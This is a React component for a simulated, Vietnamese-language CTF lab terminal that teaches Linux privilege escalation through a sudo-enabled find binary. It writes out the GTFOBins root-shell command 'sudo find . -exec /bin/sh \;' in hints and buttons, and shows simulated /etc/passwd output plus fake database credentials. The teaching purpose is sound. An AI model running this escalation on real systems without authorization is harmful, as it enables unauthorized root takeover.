import React, { useState, useRef, useEffect } from 'react';
import { sound } from '../utils/audio';
import {
  Terminal,
  ShieldAlert,
  Award,
  Sparkles,
  HelpCircle,
  Copy,
  CheckCircle2,
  Volume2,
  RefreshCw,
  ExternalLink,
  ChevronRight,
  Zap,
} from 'lucide-react';

interface TerminalLine {
  id: string;
  type: 'prompt' | 'output' | 'error' | 'success' | 'system' | 'banner';
  promptUser?: string;
  promptHost?: string;
  promptDir?: string;
  isRootPrompt?: boolean;
  text: string;
}

export const HackerTerminalTab: React.FC = () => {
  // Machine session states:
  // 'attacker' (kali@attacker:~$) or 'target_user' (www-data@target:/var/www/html$) or 'target_root' (root@target:/#)
  const [sessionState, setSessionState] = useState<'target_user' | 'target_root'>('target_user');
  const [currentDir, setCurrentDir] = useState<string>('/var/www/html');
  const [commandInput, setCommandInput] = useState<string>('');
  const [history, setHistory] = useState<string[]>([]);
  const [historyIdx, setHistoryIdx] = useState<number>(-1);
  const [hasEscalated, setHasEscalated] = useState<boolean>(false);
  const [showCelebration, setShowCelebration] = useState<boolean>(false);
  const [soundEnabled, setSoundEnabled] = useState<boolean>(true);
  const [copiedFlag, setCopiedFlag] = useState<boolean>(false);
  const [mobileTab, setMobileTab] = useState<'terminal' | 'briefing'>('terminal');

  const terminalEndRef = useRef<HTMLDivElement>(null);
  const inputRef = useRef<HTMLInputElement>(null);

  // Initial terminal state
  const [lines, setLines] = useState<TerminalLine[]>([
    {
      id: 'init-1',
      type: 'system',
      text: 'Linux target.local 5.4.0-150-generic #167-Ubuntu SMP Mon May 15 17:35:05 UTC 2026 x86_64',
    },
    {
      id: 'init-2',
      type: 'system',
      text: 'Tình huống: Bạn vừa khai thác thành công lỗ hổng RCE trên Web Server và thu được Low-Privilege Shell (www-data).',
    },
    {
      id: 'init-3',
      type: 'system',
      text: 'Nhiệm vụ: Trinh sát hệ thống, phát hiện cấu hình sudo yếu kém và leo lên quyền root cao nhất!',
    },
    {
      id: 'init-4',
      type: 'output',
      text: 'Gợi ý: Gõ "help" để xem danh sách lệnh hoặc kiểm tra quyền phân bổ với "sudo -l".',
    },
  ]);

  // Auto scroll to bottom
  useEffect(() => {
    terminalEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [lines]);

  // Play Web Audio API synthesized victory fanfare
  const playVictorySound = () => {
    sound.playSuccess();
  };

  const handleCommandSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const rawCmd = commandInput.trim();
    if (!rawCmd) return;

    sound.playKeypress();

    // Add to history
    setHistory((prev) => [...prev, rawCmd]);
    setHistoryIdx(-1);

    const isRoot = sessionState === 'target_root';
    const promptUser = isRoot ? 'root' : 'www-data';
    const promptHost = 'target';
    const promptDir = isRoot ? '/' : currentDir;

    const newEntries: TerminalLine[] = [
      {
        id: `cmd-${Date.now()}`,
        type: 'prompt',
        promptUser,
        promptHost,
        promptDir,
        isRootPrompt: isRoot,
        text: rawCmd,
      },
    ];

    const cmd = rawCmd.toLowerCase();

    // 1. CLEAR command
    if (cmd === 'clear') {
      setLines([]);
      setCommandInput('');
      return;
    }

    // 2. HELP command
    if (cmd === 'help') {
      newEntries.push({
        id: `out-${Date.now()}-1`,
        type: 'output',
        text: `Danh sách các lệnh hỗ trợ trên hệ thống:
  help                             : Hiển thị bảng trợ giúp và mục tiêu nhiệm vụ
  whoami                           : Trả về tên người dùng hiện tại
  id                               : Hiển thị UID, GID và các nhóm quyền
  uname -a                         : Xem phiên bản nhân hệ điều hành Linux Kernel
  pwd                              : Đường dẫn thư mục làm việc hiện tại
  ls [-la]                         : Liệt kê các file trong thư mục
  cat <file>                       : Đọc nội dung tệp tin (ví dụ: cat /etc/passwd, cat /var/www/html/index.php)
  nmap -sV -p 22,80 target.local   : Quét cổng dịch vụ mạng
  sudo -l                          : Kiểm tra đặc quyền sudo được cấp phát cho user
  sudo find ...                    : Khai thác leo quyền GTFOBins qua lệnh find
  cat /root/flag.txt               : Đọc file cờ chiến thắng (chỉ root mới đọc được)
  exit                             : Thoát phiên root trở lại quyền www-data
  clear                            : Xóa sạch màn hình dòng lệnh`,
      });
    }
    // 3. WHOAMI command
    else if (cmd === 'whoami') {
      newEntries.push({
        id: `out-${Date.now()}-whoami`,
        type: 'output',
        text: isRoot ? 'root' : 'www-data',
      });
    }
    // 4. ID command
    else if (cmd === 'id') {
      newEntries.push({
        id: `out-${Date.now()}-id`,
        type: 'output',
        text: isRoot
          ? 'uid=0(root) gid=0(root) groups=0(root)'
          : 'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      });
    }
    // 5. UNAME -A command
    else if (cmd.startsWith('uname')) {
      newEntries.push({
        id: `out-${Date.now()}-uname`,
        type: 'output',
        text: 'Linux target.local 5.4.0-150-generic #167-Ubuntu SMP Mon May 15 17:35:05 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux',
      });
    }
    // 6. PWD command
    else if (cmd === 'pwd') {
      newEntries.push({
        id: `out-${Date.now()}-pwd`,
        type: 'output',
        text: isRoot ? '/' : currentDir,
      });
    }
    // 7. NMAP command
    else if (cmd.startsWith('nmap')) {
      newEntries.push({
        id: `out-${Date.now()}-nmap`,
        type: 'output',
        text: `Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-21 07:44 UTC
Nmap scan report for target.local (10.0.0.1)
Host is up (0.00021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. 1 IP address (1 host up) scanned in 1.48 seconds`,
      });
    }
    // 8. LS / LS -LA command
    else if (cmd === 'ls' || cmd === 'ls -la' || cmd === 'ls -l' || cmd === 'ls -a') {
      if (isRoot) {
        newEntries.push({
          id: `out-${Date.now()}-ls`,
          type: 'output',
          text: `total 48
drwxr-xr-x  19 root root  4096 Oct 21 07:40 .
drwxr-xr-x  19 root root  4096 Oct 21 07:40 ..
lrwxrwxrwx   1 root root     7 May 15 17:35 bin -> usr/bin
drwxr-xr-x   2 root root  4096 May 15 17:36 boot
drwxr-xr-x  84 root root  4096 Oct 21 07:30 etc
drwxr-xr-x   3 root root  4096 Oct 21 07:10 home
drwx------   3 root root  4096 Oct 21 07:42 root
-r--------   1 root root    43 Oct 21 07:42 root_flag.txt
drwxr-xr-x  14 root root  4096 Oct 21 07:31 var`,
        });
      } else {
        newEntries.push({
          id: `out-${Date.now()}-ls`,
          type: 'output',
          text: `total 32
drwxr-xr-x 2 www-data www-data  4096 Oct 21 07:30 .
drwxr-xr-x 3 root     root      4096 Oct 21 07:20 ..
-rw-r--r-- 1 www-data www-data 10918 Oct 21 07:25 index.php
-rw-r--r-- 1 www-data www-data  1420 Oct 21 07:28 config.php
-rw-r--r-- 1 root     root       521 Oct 21 07:29 server_audit.log`,
        });
      }
    }
    // 9. CAT /ETC/PASSWD
    else if (cmd === 'cat /etc/passwd') {
      newEntries.push({
        id: `out-${Date.now()}-passwd`,
        type: 'output',
        text: `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup-operator:x:1001:1001:Backup Operator,,,:/home/backup-operator:/bin/bash`,
      });
    }
    // 10. CAT CONFIG.PHP / INDEX.PHP
    else if (cmd.includes('cat') && (cmd.includes('config.php') || cmd.includes('index.php'))) {
      newEntries.push({
        id: `out-${Date.now()}-config`,
        type: 'output',
        text: `<?php
// Production Database Credentials
define('DB_HOST', '127.0.0.1');
define('DB_USER', 'web_app_user');
define('DB_PASS', 'S3cur3P@ssw0rd2026!');
define('SECRET_KEY', 'jwt_signing_key_44129a01');
?>`,
      });
    }
    // 11. SUDO -L command (CRITICAL POINT)
    else if (cmd === 'sudo -l') {
      newEntries.push({
        id: `out-${Date.now()}-sudol`,
        type: 'output',
        text: `Matching Defaults entries for www-data on target:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin

User www-data may run the following commands on target:
    (ALL : ALL) NOPASSWD: /usr/bin/find`,
      });
      newEntries.push({
        id: `out-${Date.now()}-sudol-hint`,
        type: 'system',
        text: `💡 PHÁT HIỆN LỖ HỔNG LEO QUYỀN (GTFOBins):
Người dùng 'www-data' được phép chạy '/usr/bin/find' với tư cách mọi user (ALL : ALL) mà KHÔNG CẦN PASSWORD!
Công cụ find hỗ trợ tham số '-exec' để thực thi lệnh trực tiếp.
Hãy tra cứu cú pháp GTFOBins để bung mở shell root!`,
      });
    }
    // 12. EXPLOIT COMMAND: sudo find . -exec /bin/sh \;
    else if (
      cmd.includes('sudo find') &&
      (cmd.includes('-exec /bin/sh') ||
        cmd.includes('-exec sh') ||
        cmd.includes('-exec /bin/bash') ||
        cmd.includes('-exec bash'))
    ) {
      setSessionState('target_root');
      setCurrentDir('/');
      setHasEscalated(true);
      setShowCelebration(true);
      playVictorySound();

      newEntries.push({
        id: `out-${Date.now()}-exploit-1`,
        type: 'success',
        text: `[+] Đang kích hoạt tham số -exec của /usr/bin/find qua đặc quyền sudo...
[+] Khởi tạo tiến trình shell /bin/sh với EUID=0 (root)!`,
      });
      newEntries.push({
        id: `out-${Date.now()}-banner`,
        type: 'banner',
        text: `🎉 PRIVILEGE ESCALATION SUCCESSFUL! YOU ARE ROOT!
[EUID=0] - BẠN ĐÃ CHIẾM TOÀN BỘ QUYỀN KIỂM SOÁT MÁY CHỦ!`,
      });
      newEntries.push({
        id: `out-${Date.now()}-prompt-root`,
        type: 'output',
        text: `root@target:/# Lệnh khuyên dùng: "id", "whoami", hoặc "cat /root/flag.txt"`,
      });
    }
    // 13. FLAG COMMAND
    else if (
      cmd.includes('cat /root/flag.txt') ||
      cmd.includes('cat /root_flag.txt') ||
      cmd.includes('cat flag.txt') ||
      cmd === 'flag'
    ) {
      if (sessionState === 'target_root') {
        newEntries.push({
          id: `out-${Date.now()}-flag`,
          type: 'success',
          text: `🏆 CHÍNH XÁC! NỘI DUNG FLAG CỦA BÀI THỰC HÀNH:
flag{gTF0B1ns_f1nd_r00t_sh3ll_pwn3d}`,
        });
      } else {
        newEntries.push({
          id: `out-${Date.now()}-flag-err`,
          type: 'error',
          text: 'cat: /root/flag.txt: Permission denied. Cần quyền root (UID 0) để đọc thư mục bảo mật /root.',
        });
      }
    }
    // 14. EXIT command
    else if (cmd === 'exit') {
      if (sessionState === 'target_root') {
        setSessionState('target_user');
        setCurrentDir('/var/www/html');
        setShowCelebration(false);
        newEntries.push({
          id: `out-${Date.now()}-exit`,
          type: 'output',
          text: 'exit: Đã đóng phiên shell root. Quay trở về tài khoản www-data@target:/var/www/html$.',
        });
      } else {
        newEntries.push({
          id: `out-${Date.now()}-exit-err`,
          type: 'error',
          text: 'Không thể thoát phiên shell chính của web app.',
        });
      }
    }
    // Unknown command
    else {
      newEntries.push({
        id: `out-${Date.now()}-unknown`,
        type: 'error',
        text: `bash: ${rawCmd.split(' ')[0]}: command not found. Gõ 'help' để xem các lệnh hợp lệ.`,
      });
    }

    setLines((prev) => [...prev, ...newEntries]);
    setCommandInput('');
  };

  // Keyboard navigation for command history (Up / Down)
  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (history.length === 0) return;
      const nextIdx = historyIdx < 0 ? history.length - 1 : Math.max(0, historyIdx - 1);
      setHistoryIdx(nextIdx);
      setCommandInput(history[nextIdx] || '');
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (history.length === 0 || historyIdx < 0) return;
      const nextIdx = historyIdx + 1;
      if (nextIdx >= history.length) {
        setHistoryIdx(-1);
        setCommandInput('');
      } else {
        setHistoryIdx(nextIdx);
        setCommandInput(history[nextIdx]);
      }
    }
  };

  const handleQuickInsert = (cmd: string) => {
    sound.playClick();
    setCommandInput(cmd);
    inputRef.current?.focus();
  };

  const handleCopyFlag = () => {
    sound.playClick();
    navigator.clipboard.writeText('flag{gTF0B1ns_f1nd_r00t_sh3ll_pwn3d}');
    setCopiedFlag(true);
    setTimeout(() => setCopiedFlag(false), 2000);
  };

  const handleResetChallenge = () => {
    sound.playClick();
    setSessionState('target_user');
    setCurrentDir('/var/www/html');
    setHasEscalated(false);
    setShowCelebration(false);
    setLines([
      {
        id: 'reset-1',
        type: 'system',
        text: '--- ĐÃ KHỞI ĐỘNG LẠI PHÒNG THỰC HÀNH CTF ---',
      },
      {
        id: 'reset-2',
        type: 'output',
        text: 'www-data@target:/var/www/html$ Bạn đang ở quyền www-data. Hãy gõ "sudo -l" để bắt đầu.',
      },
    ]);
  };

  return (
    <div className="flex-1 w-full h-full min-h-0 overflow-hidden flex flex-col bg-[#000000]">
      {/* Mobile Sub-Navigation Bar */}
      <div className="lg:hidden px-2.5 py-1.5 bg-[#0a0a0d] border-b border-[#27272a] flex items-center justify-between shrink-0">
        <div className="flex items-center p-0.5 bg-black border border-neutral-800 rounded-lg w-full">
          <button
            onClick={() => {
              sound.playClick();
              setMobileTab('terminal');
            }}
            className={`flex-1 py-1.5 px-2 text-xs font-semibold rounded-md flex items-center justify-center gap-1.5 transition-all cursor-pointer ${
              mobileTab === 'terminal'
                ? 'bg-neutral-800 text-white shadow-sm'
                : 'text-neutral-400 hover:text-white'
            }`}
          >
            <Terminal className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
            <span>Terminal CLI</span>
          </button>

          <button
            onClick={() => {
              sound.playClick();
              setMobileTab('briefing');
            }}
            className={`flex-1 py-1.5 px-2 text-xs font-semibold rounded-md flex items-center justify-center gap-1.5 transition-all cursor-pointer ${
              mobileTab === 'briefing'
                ? 'bg-purple-950/80 text-purple-200 border border-purple-600/50 shadow-sm'
                : 'text-neutral-400 hover:text-white'
            }`}
          >
            <Sparkles className="w-3.5 h-3.5 text-purple-400 shrink-0" />
            <span>Gợi Ý & GTFOBins</span>
          </button>
        </div>
      </div>

      <div className="flex-1 w-full min-h-0 overflow-hidden flex flex-col lg:flex-row">
        {/* LEFT: XTERM TERMINAL EMULATION */}
        <div
          className={`w-full lg:w-[68%] h-full flex flex-col border-r border-[#27272a] bg-[#000000] overflow-hidden select-text ${
            mobileTab === 'terminal' ? 'flex' : 'hidden lg:flex'
          }`}
        >
        {/* Terminal Window Header Bar */}
        <div className="h-9 px-3.5 bg-[#0a0a0d] border-b border-[#27272a] flex items-center justify-between shrink-0 select-none">
          {/* Traffic lights + Title */}
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-1.5">
              <div className="w-2.5 h-2.5 rounded-full bg-red-500/80" />
              <div className="w-2.5 h-2.5 rounded-full bg-amber-500/80" />
              <div className="w-2.5 h-2.5 rounded-full bg-emerald-500/80" />
            </div>

            <div className="flex items-center gap-2">
              <Terminal className="w-3.5 h-3.5 text-neutral-400" />
              <span className="text-xs font-mono text-neutral-200 font-semibold">
                {sessionState === 'target_root'
                  ? 'root@target:/ (Privileged Interactive Shell)'
                  : 'www-data@target:/var/www/html (Low-Privilege Shell)'}
              </span>
            </div>
          </div>

          {/* Right Status Badge */}
          <div className="flex items-center gap-2.5">
            <button
              onClick={() => setSoundEnabled((prev) => !prev)}
              className={`p-1 rounded text-xs transition-colors ${
                soundEnabled ? 'text-emerald-400' : 'text-neutral-600'
              }`}
              title="Bật/Tắt âm thanh hiệu ứng"
            >
              <Volume2 className="w-3.5 h-3.5" />
            </button>

            <button
              onClick={handleResetChallenge}
              className="p-1 text-neutral-400 hover:text-neutral-200 transition-colors"
              title="Khởi động lại thử thách"
            >
              <RefreshCw className="w-3.5 h-3.5" />
            </button>

            <span
              className={`text-[10px] font-mono px-2 py-0.5 rounded font-bold ${
                sessionState === 'target_root'
                  ? 'bg-red-950/80 text-red-300 border border-red-500/80 shadow-[0_0_10px_rgba(239,68,68,0.3)]'
                  : 'bg-neutral-900 text-neutral-400 border border-neutral-800'
              }`}
            >
              {sessionState === 'target_root' ? '● EUID=0 ROOT' : '○ UID=33 WWW-DATA'}
            </span>
          </div>
        </div>

        {/* Celebration Banner when escalated */}
        {showCelebration && (
          <div className="p-3 bg-gradient-to-r from-red-950/90 via-red-900/80 to-purple-950/90 border-b border-red-500 text-white flex items-center justify-between shrink-0 shadow-lg animate-pulse select-none">
            <div className="flex items-center gap-2.5">
              <Award className="w-5 h-5 text-amber-300 shrink-0" />
              <div>
                <div className="text-xs font-extrabold tracking-wide uppercase text-amber-300">
                  🎉 PRIVILEGE ESCALATION SUCCESSFUL! YOU ARE ROOT!
                </div>
                <div className="text-[11px] text-neutral-200 font-mono">
                  Đã leo quyền thành công qua GTFOBins sudo find. Flag:{' '}
                  <code className="text-amber-200 font-bold">
                    flag&#123;gTF0B1ns_f1nd_r00t_sh3ll_pwn3d&#125;
                  </code>
                </div>
              </div>
            </div>

            <button
              onClick={handleCopyFlag}
              className="px-2.5 py-1 bg-black/60 hover:bg-black/90 text-amber-200 text-xs font-mono font-semibold rounded border border-amber-400/50 flex items-center gap-1 shrink-0"
            >
              <Copy className="w-3 h-3" />
              <span>{copiedFlag ? 'Đã chép!' : 'Copy Flag'}</span>
            </button>
          </div>
        )}

        {/* Xterm Terminal Canvas (Pure Black, Crisp JetBrains Mono) */}
        <div
          onClick={() => inputRef.current?.focus()}
          className="flex-1 p-4 overflow-y-auto font-mono text-[12px] leading-relaxed bg-[#000000] cursor-text space-y-1.5"
        >
          {lines.map((entry) => (
            <div key={entry.id} className="break-words">
              {entry.type === 'prompt' && (
                <div className="flex items-center gap-1.5 text-neutral-100 font-semibold">
                  {entry.isRootPrompt ? (
                    <span className="text-red-500 font-bold">
                      {entry.promptUser}@{entry.promptHost}:{entry.promptDir}#
                    </span>
                  ) : (
                    <span className="text-emerald-400 font-bold">
                      {entry.promptUser}@{entry.promptHost}:{entry.promptDir}$
                    </span>
                  )}
                  <span className="text-white ml-1">{entry.text}</span>
                </div>
              )}

              {entry.type === 'output' && (
                <div className="text-neutral-300 whitespace-pre-wrap">{entry.text}</div>
              )}

              {entry.type === 'error' && (
                <div className="text-red-400 whitespace-pre-wrap font-medium">{entry.text}</div>
              )}

              {entry.type === 'success' && (
                <div className="text-emerald-400 whitespace-pre-wrap font-bold">{entry.text}</div>
              )}

              {entry.type === 'system' && (
                <div className="text-blue-400 whitespace-pre-wrap italic">{entry.text}</div>
              )}

              {entry.type === 'banner' && (
                <div className="my-2 p-2.5 bg-red-950/40 border border-red-500 rounded text-red-200 whitespace-pre-wrap font-bold">
                  {entry.text}
                </div>
              )}
            </div>
          ))}

          {/* Active Command Input Line */}
          <form onSubmit={handleCommandSubmit} className="flex items-center gap-1.5 pt-1">
            {sessionState === 'target_root' ? (
              <span className="text-red-500 font-bold select-none shrink-0">
                root@target:/#{' '}
              </span>
            ) : (
              <span className="text-emerald-400 font-bold select-none shrink-0">
                www-data@target:{currentDir}${' '}
              </span>
            )}

            <div className="flex-1 relative flex items-center">
              <input
                ref={inputRef}
                type="text"
                value={commandInput}
                onChange={(e) => setCommandInput(e.target.value)}
                onKeyDown={handleKeyDown}
                className="w-full bg-transparent outline-none text-white font-mono text-[12px] caret-transparent"
                autoFocus
                spellCheck={false}
                autoCapitalize="off"
                autoComplete="off"
              />

              {/* Classic Xterm blinking cursor (#22c55e) */}
              <span
                className="w-2 h-4 bg-[#22c55e] inline-block animate-pulse ml-0.5 select-none"
                style={{ verticalAlign: 'middle' }}
              />
            </div>
          </form>

          <div ref={terminalEndRef} />
        </div>

        {/* Quick Clickable Command Bar */}
        <div className="px-3 py-1.5 bg-[#0a0a0d] border-t border-[#27272a] flex items-center gap-1.5 overflow-x-auto shrink-0 select-none">
          <span className="text-[10px] font-mono text-neutral-500 shrink-0">Lệnh mẫu nhanh:</span>
          {[
            'help',
            'whoami',
            'id',
            'sudo -l',
            'nmap -sV -p 22,80 target.local',
            'cat /etc/passwd',
            'sudo find . -exec /bin/sh \\;',
            'cat /root/flag.txt',
            'clear',
          ].map((cmd) => (
            <button
              key={cmd}
              type="button"
              onClick={() => handleQuickInsert(cmd)}
              className="px-2 py-0.5 rounded bg-[#121215] border border-neutral-800 text-[11px] font-mono text-neutral-300 hover:border-emerald-500 hover:text-emerald-300 transition-colors whitespace-nowrap"
            >
              {cmd}
            </button>
          ))}
        </div>
      </div>

      {/* RIGHT: Socratic Guidance & GTFOBins Inspector Panel (32% on desktop) */}
      <div
        className={`w-full lg:w-[32%] h-full flex flex-col bg-[#0c0c0e] overflow-y-auto p-4 space-y-4 select-none ${
          mobileTab === 'briefing' ? 'flex' : 'hidden lg:flex'
        }`}
      >
        {/* Mission Briefing */}
        <div className="p-3.5 rounded-lg border border-[#27272a] bg-[#121215]">
          <div className="flex items-center gap-2 text-xs font-bold text-neutral-100 uppercase tracking-wide mb-1.5">
            <ShieldAlert className="w-4 h-4 text-emerald-400" />
            <span>Thử Thách: Leo Thang Đặc Quyền Linux</span>
          </div>

          <p className="text-xs text-neutral-400 leading-relaxed">
            Bạn đang kiểm soát phiên làm việc của người dùng dịch vụ web{' '}
            <code className="text-emerald-300 font-mono">www-data</code>. Hãy phát hiện tệp nhị phân có đặc quyền thực thi cao và leo lên làm chủ hoàn toàn máy chủ!
          </p>

          <div className="mt-3 pt-2.5 border-t border-neutral-800 space-y-1.5 text-[11px] font-mono">
            <div className="flex items-center justify-between">
              <span className="text-neutral-500">Mục tiêu:</span>
              <span className="text-neutral-200">Đạt quyền root (UID=0)</span>
            </div>
            <div className="flex items-center justify-between">
              <span className="text-neutral-500">Trạng thái hiện tại:</span>
              <span
                className={`font-bold ${
                  sessionState === 'target_root' ? 'text-red-400' : 'text-emerald-400'
                }`}
              >
                {sessionState === 'target_root' ? 'ROOT CAPTURED' : 'LOW PRIVILEGE (www-data)'}
              </span>
            </div>
          </div>
        </div>

        {/* Socratic Hint & GTFOBins Helper Panel */}
        <div className="p-3.5 rounded-lg border border-purple-900/40 bg-purple-950/20 space-y-2.5">
          <div className="flex items-center gap-2 text-xs font-bold text-purple-300 uppercase tracking-wide">
            <Sparkles className="w-4 h-4 text-purple-400" />
            <span>Gợi Ý Socratic & Kho Cứu Sinh GTFOBins</span>
          </div>

          <p className="text-xs text-neutral-300 leading-relaxed">
            Khi quản trị viên Linux sơ suất cấp quyền <code className="text-purple-300 font-mono font-bold">NOPASSWD</code> cho các tệp nhị phân có khả năng thực thi lệnh ngoài, người dùng bình thường có thể mượn quyền đó để spawn shell root.
          </p>

          <div className="p-2.5 rounded bg-black/60 border border-purple-800/40 font-mono text-[11px] text-purple-200 space-y-1.5">
            <div className="text-neutral-400 text-[10px]">Cú pháp khai thác GTFOBins cho find:</div>
            <div className="p-1.5 bg-neutral-900 rounded text-emerald-400 font-bold select-text">
              sudo find . -exec /bin/sh \;
            </div>
            <div className="text-[10px] text-neutral-400">
              Giải thích: Tham số <code className="text-purple-300">-exec</code> của find chạy lệnh với tư cách người gọi sudo (ở đây là root). Khi gọi <code className="text-purple-300">/bin/sh</code>, một tiến trình shell root mới sẽ được sinh ra ngay lập tức!
            </div>
          </div>

          <button
            onClick={() => handleQuickInsert('sudo find . -exec /bin/sh \\;')}
            className="w-full py-1.5 px-3 bg-purple-600 hover:bg-purple-500 text-white rounded text-xs font-semibold flex items-center justify-center gap-1.5 transition-colors cursor-pointer"
          >
            <Zap className="w-3.5 h-3.5" />
            <span>Nạp Lệnh Khai Thác Nhanh Vào Terminal</span>
          </button>
        </div>

        {/* Flag Card */}
        <div className="p-3.5 rounded-lg border border-[#27272a] bg-[#121215] space-y-2">
          <div className="flex items-center gap-2 text-xs font-bold text-neutral-100 uppercase tracking-wide">
            <Award className="w-4 h-4 text-amber-400" />
            <span>Cờ Chiến Thắng (CTF Flag)</span>
          </div>

          {sessionState === 'target_root' ? (
            <div className="p-2.5 rounded bg-amber-950/40 border border-amber-500/50 space-y-1.5">
              <div className="text-[11px] text-amber-300 font-semibold flex items-center gap-1.5">
                <CheckCircle2 className="w-3.5 h-3.5 text-amber-400" />
                <span>Bạn đã tìm thấy flag bí mật:</span>
              </div>
              <div className="p-2 bg-black rounded font-mono text-xs text-amber-200 font-bold break-all border border-amber-900/60 select-text">
                flag&#123;gTF0B1ns_f1nd_r00t_sh3ll_pwn3d&#125;
              </div>
              <button
                onClick={handleCopyFlag}
                className="w-full mt-1 py-1 bg-amber-600 hover:bg-amber-500 text-black text-xs font-bold rounded transition-colors"
              >
                {copiedFlag ? 'Đã sao chép vào bộ nhớ!' : 'Sao Chép Flag'}
              </button>
            </div>
          ) : (
            <div className="text-xs text-neutral-500 italic">
              Flag được giấu trong tệp tin <code className="text-neutral-400">/root/flag.txt</code>. Hãy hoàn thành việc leo quyền lên root để mở khóa!
            </div>
          )}
        </div>
      </div>
    </div>
  </div>
  );
};
